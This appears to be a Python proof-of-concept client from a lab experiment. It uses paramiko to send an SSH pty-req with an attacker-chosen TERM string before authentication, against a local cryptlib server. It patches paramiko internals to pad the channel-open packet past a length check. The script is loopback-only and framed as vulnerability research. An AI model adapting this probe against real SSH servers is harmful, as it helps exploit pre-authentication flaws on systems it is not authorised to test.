#!/usr/bin/env python3
"""Loopback-only SSH client for the W9 pre-auth pty-req experiment.

Sends pty-req with a caller-supplied TERM before (or after) the authentication
request, using paramiko's public-ish transport API.  The --pad-channel-open
flag appends two bytes to the single SSH_MSG_CHANNEL_OPEN packet: the pinned
cryptlib auth-phase length check requires >=26 bytes for that packet while
paramiko emits the RFC-shaped 24 bytes.  Padding is a probe accommodation so
the packet reaches cryptlib's state-machine check; it is not part of the
vulnerability claim and the same flag is used in both server configurations.
"""

import argparse
import socket
import sys
import time

import paramiko


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--term", required=True)
    ap.add_argument("--service-request", action="store_true")
    ap.add_argument("--pad-channel-open", action="store_true")
    ap.add_argument("--auth-none-before-pty", action="store_true")
    ap.add_argument("--seconds", type=int, default=8)
    args = ap.parse_args()

    started = time.time()

    def log(msg):
        print(f"{time.time() - started:6.2f} CLIENT {msg}", flush=True)

    sock = socket.create_connection(("127.0.0.1", args.port), timeout=8)
    cls = paramiko.ServiceRequestingTransport if args.service_request else paramiko.Transport
    t = cls(sock)
    t.start_client(timeout=10)
    log(f"kex done remote_version={t.remote_version!r}")
    if args.service_request:
        t.ensure_session()
        log("service ssh-userauth accepted")
    if args.auth_none_before_pty:
        # paramiko 5.1.0's Transport.auth_none() passes no finish_message
        # callback to send_auth_request(), which then calls None; supply it.
        t.auth_handler.send_auth_request("lab", "none", lambda m: None)
        log("auth_none before channel -> accepted")
    if args.pad_channel_open:
        original = t._send_user_message

        def padded(msg):
            raw = msg.asbytes()
            if raw and raw[0] == 90:  # SSH_MSG_CHANNEL_OPEN
                log(f"padding channel-open {len(raw)} -> {len(raw) + 2} bytes")
                raw += b"\x00\x00"
            return original(paramiko.Message(raw))

        t._send_user_message = padded
    try:
        ch = t.open_session(timeout=10)
        log(f"channel open chanid={ch.chanid}")
        ch.get_pty(term=args.term, width=80, height=24,
                   width_pixels=640, height_pixels=480)
        log(f"pty-req sent term_len={len(args.term)}")
        ch.invoke_shell()
        log("shell request sent")
        deadline = time.time() + args.seconds
        while time.time() < deadline:
            if ch.send_ready() and ch.send("x\n"):
                pass
            if ch.recv_ready():
                data = ch.recv(4096)
                log(f"recv {len(data)} bytes: {data[:80]!r}")
            time.sleep(0.2)
        log("done")
    finally:
        t.close()


if __name__ == "__main__":
    sys.exit(main())
